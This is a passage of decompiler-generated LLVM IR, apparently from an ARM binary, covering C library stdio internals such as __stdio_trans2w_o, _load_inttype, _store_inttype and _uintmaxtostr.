  %v0_19f44 = load i32, i32* @r5, align 4
  %v1_19f44 = add i32 %v0_19f44, 16
  %v2_19f44 = inttoptr i32 %v1_19f44 to i32*
  %v3_19f44 = load i32, i32* %v2_19f44, align 4
  %v1_19f48 = load i32, i32* @r4, align 4
  %v2_19f48 = add i32 %v1_19f48, %v3_19f44
  store i32 %v2_19f48, i32* %v2_19f44, align 4
  br label %dec_label_pc_1a028

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19f18
  store i32 %v2_19f2c, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_19f2c, %arg2
  br i1 %tmp18, label %dec_label_pc_19ff4, label %dec_label_pc_19f60

dec_label_pc_19f60:                               ; preds = %dec_label_pc_19f54
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19f68 = call i32 @memcpy()
  %v0_19f6c = load i32, i32* @r5, align 4
  %v1_19f6c = add i32 %v0_19f6c, 16
  %v2_19f6c = inttoptr i32 %v1_19f6c to i32*
  %v3_19f6c = load i32, i32* %v2_19f6c, align 4
  %v1_19f70 = inttoptr i32 %v0_19f6c to i16*
  %v2_19f70 = load i16, i16* %v1_19f70, align 2
  %v1_19f74 = load i32, i32* @r6, align 4
  %v2_19f74 = add i32 %v1_19f74, %v3_19f6c
  %v1_19f78 = and i16 %v2_19f70, 256
  %v2_19f78 = icmp eq i16 %v1_19f78, 0
  store i32 %v2_19f74, i32* %v2_19f6c, align 4
  br i1 %v2_19f78, label %dec_label_pc_1a028, label %dec_label_pc_19f84

dec_label_pc_19f84:                               ; preds = %dec_label_pc_19f60
  %v0_19f84 = load i32, i32* @r7, align 4
  %v0_19f8c = load i32, i32* @r6, align 4
  %v4_19f90 = call i32 @memrchr(i32 %v0_19f84, i32 10, i32 %v0_19f8c, i32 %v2_19f74)
  %v2_19f94 = icmp eq i32 %v4_19f90, 0
  br i1 %v2_19f94, label %dec_label_pc_1a028, label %dec_label_pc_19f9c

dec_label_pc_19f9c:                               ; preds = %dec_label_pc_19f84
  %v0_19f9c = load i32, i32* @r5, align 4
  store i32 %v0_19f9c, i32* @r0, align 4
  %v0_19fa0 = call i32 @__stdio_wcommit()
  %v2_19fa4 = icmp eq i32 %v0_19fa0, 0
  br i1 %v2_19fa4, label %dec_label_pc_1a028, label %dec_label_pc_19fac

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19f9c
  %v1_19fac = load i32, i32* @r6, align 4
  %v3_19fac = icmp uge i32 %v0_19fa0, %v1_19fac
  %v1_19fac.v0_19fa0 = select i1 %v3_19fac, i32 %v1_19fac, i32 %v0_19fa0
  store i32 %v1_19fac.v0_19fa0, i32* @r4, align 4
  %v2_19fb8 = sub i32 %v1_19fac, %v1_19fac.v0_19fa0
  %v0_19fbc = load i32, i32* @r7, align 4
  %v2_19fbc = add i32 %v0_19fbc, %v2_19fb8
  store i32 %v2_19fbc, i32* %r7.global-to-local, align 4
  store i32 %v2_19fbc, i32* @r0, align 4
  store i32 %v1_19fac.v0_19fa0, i32* @r2, align 4
  %v4_19fcc = call i32 @__GI_memchr(i32 %v2_19fbc, i32 10, i32 %v1_19fac.v0_19fa0, i32 %v2_19fb8)
  %v2_19fd0 = icmp eq i32 %v4_19fcc, 0
  br i1 %v2_19fd0, label %dec_label_pc_1a028, label %dec_label_pc_19fd8

dec_label_pc_19fd8:                               ; preds = %dec_label_pc_19fac
  %v0_19fd8 = load i32, i32* @r5, align 4
  %v1_19fd8 = add i32 %v0_19fd8, 16
  %v2_19fd8 = inttoptr i32 %v1_19fd8 to i32*
  %v3_19fd8 = load i32, i32* %v2_19fd8, align 4
  %v0_19fdc = load i32, i32* %r7.global-to-local, align 4
  %v1_19fdc = load i32, i32* @r4, align 4
  %v2_19fdc = sub i32 %v0_19fdc, %v4_19fcc
  %v2_19fe0 = add i32 %v2_19fdc, %v1_19fdc
  %v2_19fe4 = sub i32 %v3_19fd8, %v2_19fe0
  %v1_19fe8 = load i32, i32* @r6, align 4
  %v2_19fe8 = sub i32 %v1_19fe8, %v2_19fe0
  store i32 %v2_19fe8, i32* @r6, align 4
  store i32 %v2_19fe4, i32* %v2_19fd8, align 4
  br label %dec_label_pc_1a028

dec_label_pc_19ff4:                               ; preds = %dec_label_pc_19f54
  %v2_19ff4 = add i32 %tmp, 8
  %v3_19ff4 = inttoptr i32 %v2_19ff4 to i32*
  %v4_19ff4 = load i32, i32* %v3_19ff4, align 4
  %v9_19ff8 = icmp eq i32 %v4_19f20, %v4_19ff4
  br i1 %v9_19ff8, label %dec_label_pc_1a014, label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %dec_label_pc_19ff4
  store i32 %tmp, i32* @r0, align 4
  %v0_1a004 = call i32 @__stdio_wcommit()
  %v2_1a008 = icmp eq i32 %v0_1a004, 0
  br i1 %v2_1a008, label %dec_label_pc_1a000.dec_label_pc_1a014_crit_edge, label %bb15

dec_label_pc_1a000.dec_label_pc_1a014_crit_edge:  ; preds = %dec_label_pc_1a000
  %v0_1a014.pre = load i32, i32* @r6, align 4
  %v0_1a018.pre = load i32, i32* @r5, align 4
  %v0_1a01c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a014

bb15:                                             ; preds = %dec_label_pc_1a000
  %v1_1a00c = load i32, i32* @r4, align 4
  store i32 %v1_1a00c, i32* @r6, align 4
  br label %dec_label_pc_1a028

dec_label_pc_1a014:                               ; preds = %dec_label_pc_1a000.dec_label_pc_1a014_crit_edge, %entry, %dec_label_pc_19ff4
  %v0_1a01c = phi i32 [ %v0_1a01c.pre, %dec_label_pc_1a000.dec_label_pc_1a014_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_19ff4 ]
  %v0_1a018 = phi i32 [ %v0_1a018.pre, %dec_label_pc_1a000.dec_label_pc_1a014_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_19ff4 ]
  %v0_1a014 = phi i32 [ %v0_1a014.pre, %dec_label_pc_1a000.dec_label_pc_1a014_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_19ff4 ]
  %v1_1a018 = inttoptr i32 %v0_1a018 to i16*
  %v5_1a020 = call i32 @__stdio_WRITE(i16* %v1_1a018, i32 %v0_1a01c, i32 %v0_1a014)
  store i32 %v5_1a020, i32* @r6, align 4
  br label %dec_label_pc_1a028

dec_label_pc_1a028:                               ; preds = %bb15, %dec_label_pc_19fac, %dec_label_pc_19f9c, %dec_label_pc_19f84, %dec_label_pc_19f60, %dec_label_pc_19fd8, %bb12, %dec_label_pc_1a014
  %v0_1a028 = load i32, i32* @r6, align 4
  %v2_1a030 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1a030, i32* @r4, align 4
  store i32 %v6_19ef8, i32* @r5, align 4
  store i32 %v9_19ef8, i32* @r6, align 4
  store i32 %v12_19ef8, i32* @r7, align 4
  ret i32 %v0_1a028

; uselistorder directives
  uselistorder i32 %v2_19fe0, { 1, 0 }
  uselistorder i32 %v2_19fb8, { 1, 0 }
  uselistorder i32 %v1_19fac.v0_19fa0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_19fac, { 1, 0, 2 }
  uselistorder i32 %v2_19f2c, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_1a028, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1a014, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a038 = load i32, i32* @r4, align 4
  store i32 %v3_1a038, i32* %stack_var_-8, align 4
  %v3_1a03c = load i16, i16* %arg1, align 2
  %v4_1a03c = zext i16 %v3_1a03c to i32
  %v2_1a040 = and i32 %v4_1a03c, %arg2
  %v4_1a040 = icmp eq i32 %v2_1a040, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1a040, label %dec_label_pc_1a04c, label %dec_label_pc_1a05c

dec_label_pc_1a04c:                               ; preds = %entry
  %v1_1a04c = and i32 %v4_1a03c, 2176
  %v2_1a04c = icmp eq i32 %v1_1a04c, 0
  br i1 %v2_1a04c, label %dec_label_pc_1a054, label %dec_label_pc_1a068

dec_label_pc_1a054:                               ; preds = %dec_label_pc_1a04c
  %v2_1a054 = or i32 %v4_1a03c, %arg2
  %v1_1a058 = trunc i32 %v2_1a054 to i16
  store i16 %v1_1a058, i16* %arg1, align 2
  %v0_1a05c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a05c

dec_label_pc_1a05c:                               ; preds = %entry, %dec_label_pc_1a054
  %v0_1a098 = phi i32 [ %tmp, %entry ], [ %v0_1a05c.pre, %dec_label_pc_1a054 ]
  %v1_1a05c = inttoptr i32 %v0_1a098 to i16*
  %v2_1a05c = load i16, i16* %v1_1a05c, align 2
  %v3_1a05c = zext i16 %v2_1a05c to i32
  store i32 %v3_1a05c, i32* @ip, align 4
  %v1_1a060 = and i32 %v3_1a05c, 32
  %v2_1a060 = icmp eq i32 %v1_1a060, 0
  br i1 %v2_1a060, label %dec_label_pc_1a088, label %dec_label_pc_1a068

dec_label_pc_1a068:                               ; preds = %dec_label_pc_1a04c, %dec_label_pc_1a05c
  %v0_1a068 = call i32 @__GI___errno_location()
  store i32 %v0_1a068, i32* %r0.global-to-local, align 4
  %v2_1a070 = inttoptr i32 %v0_1a068 to i32*
  store i32 9, i32* %v2_1a070, align 4
  br label %dec_label_pc_1a074

dec_label_pc_1a074:                               ; preds = %dec_label_pc_1a0b0, %dec_label_pc_1a068
  %v0_1a074 = load i32, i32* @r4, align 4
  %v1_1a074 = inttoptr i32 %v0_1a074 to i16*
  %v2_1a074 = load i16, i16* %v1_1a074, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1a07c = or i16 %v2_1a074, 8
  store i16 %v1_1a07c, i16* %v1_1a074, align 2
  br label %bb11

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a05c
  %tmp14 = urem i16 %v2_1a05c, 4
  %v2_1a088 = icmp eq i16 %tmp14, 0
  br i1 %v2_1a088, label %dec_label_pc_1a0e4, label %dec_label_pc_1a090

dec_label_pc_1a090:                               ; preds = %dec_label_pc_1a088
  %v1_1a090 = and i32 %v3_1a05c, 4
  store i32 %v1_1a090, i32* @r1, align 4
  %v2_1a090 = icmp eq i32 %v1_1a090, 0
  br i1 %v2_1a090, label %dec_label_pc_1a098, label %dec_label_pc_1a0c8

dec_label_pc_1a098:                               ; preds = %dec_label_pc_1a090
  %v1_1a098 = add i32 %v0_1a098, 20
  %v2_1a098 = inttoptr i32 %v1_1a098 to i32*
  %v3_1a098 = load i32, i32* %v2_1a098, align 4
  store i32 %v3_1a098, i32* %r2.global-to-local, align 4
  %v1_1a09c = add i32 %v0_1a098, 16
  %v2_1a09c = inttoptr i32 %v1_1a09c to i32*
  %v3_1a09c = load i32, i32* %v2_1a09c, align 4
  %v9_1a0a0 = icmp eq i32 %v3_1a098, %v3_1a09c
  br i1 %v9_1a0a0, label %dec_label_pc_1a0a8, label %dec_label_pc_1a0b0

dec_label_pc_1a0a8:                               ; preds = %dec_label_pc_1a098
  %v1_1a0a8 = and i32 %v3_1a05c, 2
  %v2_1a0a8 = icmp eq i32 %v1_1a0a8, 0
  br i1 %v2_1a0a8, label %dec_label_pc_1a0c8, label %dec_label_pc_1a0b0

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a098, %dec_label_pc_1a0a8
  %v1_1a0b0 = and i32 %v3_1a05c, 1024
  %tmp12 = udiv i32 %v1_1a0b0, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_1a0bc = call i32 @__GI_fseek()
  store i32 %v0_1a0bc, i32* %r0.global-to-local, align 4
  %v2_1a0c0 = icmp eq i32 %v0_1a0bc, 0
  br i1 %v2_1a0c0, label %.dec_label_pc_1a0c8_crit_edge, label %dec_label_pc_1a074

.dec_label_pc_1a0c8_crit_edge:                    ; preds = %dec_label_pc_1a0b0
  %v0_1a0c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a0c8

dec_label_pc_1a0c8:                               ; preds = %.dec_label_pc_1a0c8_crit_edge, %dec_label_pc_1a090, %dec_label_pc_1a0a8
  %v2_1a0d4 = phi i32 [ %v0_1a0c8.pre, %.dec_label_pc_1a0c8_crit_edge ], [ %v0_1a098, %dec_label_pc_1a090 ], [ %v0_1a098, %dec_label_pc_1a0a8 ]
  %v1_1a0c8 = inttoptr i32 %v2_1a0d4 to i16*
  %v2_1a0c8 = load i16, i16* %v1_1a0c8, align 2
  %v1_1a0cc = add i32 %v2_1a0d4, 8
  %v2_1a0cc = inttoptr i32 %v1_1a0cc to i32*
  %v3_1a0cc = load i32, i32* %v2_1a0cc, align 4
  store i32 %v3_1a0cc, i32* %r2.global-to-local, align 4
  %v1_1a0d0 = and i16 %v2_1a0c8, -4
  store i16 %v1_1a0d0, i16* %v1_1a0c8, align 2
  %v0_1a0d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0d8 = load i32, i32* @r4, align 4
  %v2_1a0d8 = add i32 %v1_1a0d8, 20
  %v3_1a0d8 = inttoptr i32 %v2_1a0d8 to i32*
  store i32 %v0_1a0d8, i32* %v3_1a0d8, align 4
  %v0_1a0dc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0dc = load i32, i32* @r4, align 4
  %v2_1a0dc = add i32 %v1_1a0dc, 24
  %v3_1a0dc = inttoptr i32 %v2_1a0dc to i32*
  store i32 %v0_1a0dc, i32* %v3_1a0dc, align 4
  %v0_1a0e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0e0 = load i32, i32* @r4, align 4
  %v2_1a0e0 = add i32 %v1_1a0e0, 16
  %v3_1a0e0 = inttoptr i32 %v2_1a0e0 to i32*
  store i32 %v0_1a0e0, i32* %v3_1a0e0, align 4
  %v0_1a0e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a0e4:                               ; preds = %dec_label_pc_1a088, %dec_label_pc_1a0c8
  %v2_1a0f0 = phi i32 [ %v0_1a098, %dec_label_pc_1a088 ], [ %v0_1a0e4.pre, %dec_label_pc_1a0c8 ]
  %v1_1a0e4 = inttoptr i32 %v2_1a0f0 to i16*
  %v2_1a0e4 = load i16, i16* %v1_1a0e4, align 2
  %v3_1a0e4 = zext i16 %v2_1a0e4 to i32
  %v1_1a0e8 = or i16 %v2_1a0e4, 64
  %v1_1a0ec = and i32 %v3_1a0e4, 2816
  store i32 %v1_1a0ec, i32* %r0.global-to-local, align 4
  %v2_1a0ec = icmp eq i32 %v1_1a0ec, 0
  store i16 %v1_1a0e8, i16* %v1_1a0e4, align 2
  br i1 %v2_1a0ec, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_1a0e4
  %v1_1a0f4 = load i32, i32* @r4, align 4
  %v2_1a0f4 = add i32 %v1_1a0f4, 12
  %v3_1a0f4 = inttoptr i32 %v2_1a0f4 to i32*
  %v4_1a0f4 = load i32, i32* %v3_1a0f4, align 4
  %v3_1a0f8 = add i32 %v1_1a0f4, 28
  %v4_1a0f8 = inttoptr i32 %v3_1a0f8 to i32*
  store i32 %v4_1a0f4, i32* %v4_1a0f8, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_1a0e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_1a074, %.thread1
  %v2_1a100 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a100, i32* @r4, align 4
  %v1_1a104 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a104

; uselistorder directives
  uselistorder i32 %v2_1a0d4, { 1, 0 }
  uselistorder i32 %v0_1a098, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1a03c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a0e4, { 1, 0 }
  uselistorder label %dec_label_pc_1a0c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a0b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a068, { 1, 0 }
  uselistorder label %dec_label_pc_1a05c, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_1a108 = load i32, i32* @r2, align 4
  %v1_1a108 = icmp slt i32 %v0_1a108, 0
  %v0_1a10c = load i32, i32* @r0, align 4
  %v1_1a110 = and i32 %v0_1a10c, 2048
  %v2_1a144 = icmp eq i32 %v1_1a110, 0
  br i1 %v1_1a108, label %dec_label_pc_1a144, label %dec_label_pc_1a118

dec_label_pc_1a118:                               ; preds = %entry
  br i1 %v2_1a144, label %dec_label_pc_1a120, label %dec_label_pc_1a14c

dec_label_pc_1a120:                               ; preds = %dec_label_pc_1a118
  %v7_1a120 = icmp eq i32 %v0_1a10c, 256
  %v0_1a124 = load i32, i32* @r1, align 4
  %v1_1a124 = inttoptr i32 %v0_1a124 to i32*
  %v2_1a124 = load i32, i32* %v1_1a124, align 4
  %v2_1a128 = urem i32 %v2_1a124, 256
  %v2_1a128.v2_1a124 = select i1 %v7_1a120, i32 %v2_1a128, i32 %v2_1a124
  br i1 %v7_1a120, label %.thread, label %dec_label_pc_1a130

dec_label_pc_1a130:                               ; preds = %dec_label_pc_1a120
  %v7_1a130 = icmp eq i32 %v0_1a10c, 512
  br i1 %v7_1a130, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a130
  %v4_1a138 = urem i32 %v2_1a128.v2_1a124, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a130, %dec_label_pc_1a120, %bb
  %v1_1a140 = phi i32 [ %v2_1a124, %dec_label_pc_1a130 ], [ %v2_1a128, %dec_label_pc_1a120 ], [ %v4_1a138, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_1a140

dec_label_pc_1a144:                               ; preds = %entry
  br i1 %v2_1a144, label %dec_label_pc_1a154, label %dec_label_pc_1a14c

dec_label_pc_1a14c:                               ; preds = %dec_label_pc_1a118, %dec_label_pc_1a144
  %v0_1a14c = load i32, i32* @r1, align 4
  %v1_1a14c = inttoptr i32 %v0_1a14c to i32*
  %v2_1a14c = load i32, i32* %v1_1a14c, align 4
  %v3_1a14c = add i32 %v0_1a14c, 4
  %v4_1a14c = inttoptr i32 %v3_1a14c to i32*
  %v5_1a14c = load i32, i32* %v4_1a14c, align 4
  store i32 %v5_1a14c, i32* @r1, align 4
  ret i32 %v2_1a14c

dec_label_pc_1a154:                               ; preds = %dec_label_pc_1a144
  %v7_1a154 = icmp eq i32 %v0_1a10c, 256
  %v0_1a158 = load i32, i32* @r1, align 4
  %v1_1a158 = inttoptr i32 %v0_1a158 to i32*
  %v2_1a158 = load i32, i32* %v1_1a158, align 4
  %v2_1a15c = urem i32 %v2_1a158, 256
  %v2_1a15c.v2_1a158 = select i1 %v7_1a154, i32 %v2_1a15c, i32 %v2_1a158
  br i1 %v7_1a154, label %.thread2, label %dec_label_pc_1a164

dec_label_pc_1a164:                               ; preds = %dec_label_pc_1a154
  %v7_1a164 = icmp eq i32 %v0_1a10c, 512
  br i1 %v7_1a164, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1a164
  %v4_1a168 = mul i32 %v2_1a15c.v2_1a158, 65536
  %v4_1a16c = sdiv i32 %v4_1a168, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a164, %dec_label_pc_1a154, %bb5
  %v0_1a170 = phi i32 [ %v2_1a158, %dec_label_pc_1a164 ], [ %v2_1a15c, %dec_label_pc_1a154 ], [ %v4_1a16c, %bb5 ]
  %v3_1a170 = ashr i32 %v0_1a170, 31
  store i32 %v3_1a170, i32* @r1, align 4
  ret i32 %v0_1a170

; uselistorder directives
  uselistorder i32 %v0_1a170, { 1, 0 }
  uselistorder i32 %v2_1a15c, { 1, 0 }
  uselistorder i32 %v2_1a158, { 1, 2, 0 }
  uselistorder i32 %v2_1a128, { 1, 0 }
  uselistorder i32 %v2_1a124, { 1, 2, 0 }
  uselistorder i1 %v2_1a144, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a14c, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_1a178 = icmp eq i32 %arg2, 256
  store i1 %v7_1a178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a178, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_1a17c = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_1a17c, i8* %tmp3, align 1
  %v1_1a180.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_1a180 = phi i1 [ false, %entry ], [ %v1_1a180.pre, %bb ]
  %v0_1a180 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a180, i32 %v0_1a180)
  %v7_1a184 = icmp eq i32 %arg2, 2048
  store i1 %v7_1a184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a184, label %dec_label_pc_1a18c, label %dec_label_pc_1a194

dec_label_pc_1a18c:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_1a18c = add i32 %tmp2, 4
  %v6_1a18c = inttoptr i32 %v5_1a18c to i32*
  store i32 %arg4, i32* %v6_1a18c, align 4
  ret i32 %tmp2

dec_label_pc_1a194:                               ; preds = %bb4
  %v7_1a194 = icmp eq i32 %arg2, 512
  store i1 %v7_1a194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a194, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1a194
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1a194
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_1a1b0 = icmp slt i32 %tmp21, 0
  %v2_1a1b0 = icmp eq i32 %tmp21, 0
  store i1 %v2_1a1b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_1a1b8 = load i32, i32* @r2, align 4
  store i32 %v0_1a1b8, i32* %r5.global-to-local, align 4
  %v0_1a1bc = load i32, i32* @r3, align 4
  store i32 %v0_1a1bc, i32* %r6.global-to-local, align 4
  br i1 %v1_1a1b0, label %dec_label_pc_1a1c4, label %dec_label_pc_1a1e4

dec_label_pc_1a1c4:                               ; preds = %entry
  %v1_1a1c4 = icmp slt i32 %v0_1a1bc, 0
  %v2_1a1c4 = icmp eq i32 %v0_1a1bc, 0
  store i1 %v2_1a1c4, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1c8 = sub i32 0, %tmp21
  store i32 %v1_1a1c8, i32* %r7.global-to-local, align 4
  br i1 %v1_1a1c4, label %dec_label_pc_1a1d0, label %dec_label_pc_1a1e4

dec_label_pc_1a1d0:                               ; preds = %dec_label_pc_1a1c4
  %v1_1a1d4 = sub i32 0, %v0_1a1b8
  store i32 %v1_1a1d4, i32* %r5.global-to-local, align 4
  %v2_1a1d4 = icmp eq i32 %v0_1a1b8, 0
  %v2_1a1d8 = icmp eq i1 %v2_1a1d4, false
  %v5_1a1d8 = sext i1 %v2_1a1d8 to i32
  %v6_1a1d8 = sub i32 %v5_1a1d8, %v0_1a1bc
  store i32 %v6_1a1d8, i32* %r6.global-to-local, align 4
  %v19_1a1d8 = icmp eq i32 %v6_1a1d8, 0
  store i1 %v19_1a1d8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a1ec

dec_label_pc_1a1e4:                               ; preds = %dec_label_pc_1a1c4, %entry
  br label %dec_label_pc_1a1ec

dec_label_pc_1a1ec:                               ; preds = %dec_label_pc_1a1d0, %dec_label_pc_1a1e4
  %storemerge = phi i8 [ 0, %dec_label_pc_1a1e4 ], [ 1, %dec_label_pc_1a1d0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1a1f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a1fc = udiv i32 -1, %v0_1a1f4
  store i32 %v2_1a1fc, i32* %fp.global-to-local, align 4
  %v3_1a20c = urem i32 -1, %v0_1a1f4
  %v1_1a210 = add i32 %v3_1a20c, 1
  store i32 %v1_1a210, i32* %sb.global-to-local, align 4
  %v9_1a214 = icmp eq i32 %v1_1a210, %v0_1a1f4
  store i1 %v9_1a214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1a214, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a1ec
  %v1_1a218 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1a218, i32* %sb.global-to-local, align 4
  %v2_1a21c = add i32 %v2_1a1fc, 1
  store i32 %v2_1a21c, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a1ec, %bb
  %v0_1a220 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a220, i32* %sl.global-to-local, align 4
  %v0_1a224 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a224, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a228

dec_label_pc_1a228thread-pre-split:               ; preds = %bb25
  %v0_1a228.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1a22c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1a230.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a228

dec_label_pc_1a228:                               ; preds = %dec_label_pc_1a228thread-pre-split, %.thread
  %v0_1a2ac = phi i32 [ %v0_1a230.pre, %dec_label_pc_1a228thread-pre-split ], [ %v0_1a1f4, %.thread ]
  %v0_1a2a4 = phi i32 [ %v0_1a22c.pre, %dec_label_pc_1a228thread-pre-split ], [ %v0_1a224, %.thread ]
  %v0_1a240 = phi i32 [ %v0_1a228.pr, %dec_label_pc_1a228thread-pre-split ], [ %v0_1a220, %.thread ]
  %v2_1a228 = icmp eq i32 %v0_1a240, 0
  store i1 %v2_1a228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a228, label %dec_label_pc_1a2a0, label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a228
  %v2_1a23c = udiv i32 %v0_1a240, %v0_1a2ac
  %v3_1a23c = urem i32 %v0_1a240, %v0_1a2ac
  store i32 %v2_1a23c, i32* %sl.global-to-local, align 4
  %v2_1a25c = udiv i32 %v0_1a2a4, %v0_1a2ac
  %v3_1a25c = urem i32 %v0_1a2a4, %v0_1a2ac
  %v0_1a260 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a260 = mul i32 %v0_1a260, %v3_1a23c
  %v2_1a268 = add i32 %v2_1a260, %v3_1a25c
  store i32 %v2_1a268, i32* %r5.global-to-local, align 4
  %v0_1a274 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a274 = mul i32 %v0_1a274, %v3_1a23c
  %v2_1a27c = add i32 %v2_1a274, %v2_1a25c
  %v2_1a284 = udiv i32 %v2_1a268, %v0_1a2ac
  %v2_1a28c = add i32 %v2_1a27c, %v2_1a284
  br label %dec_label_pc_1a2b8

dec_label_pc_1a2a0:                               ; preds = %dec_label_pc_1a228
  %v2_1a2a0 = udiv i32 %v0_1a2a4, %v0_1a2ac
  br label %dec_label_pc_1a2b8

dec_label_pc_1a2b8:                               ; preds = %dec_label_pc_1a238, %dec_label_pc_1a2a0
  %storemerge28 = phi i32 [ %v2_1a2a0, %dec_label_pc_1a2a0 ], [ %v2_1a28c, %dec_label_pc_1a238 ]
  %v0_1a2d4 = phi i32 [ %v2_1a2a0, %dec_label_pc_1a2a0 ], [ %v2_1a28c, %dec_label_pc_1a238 ]
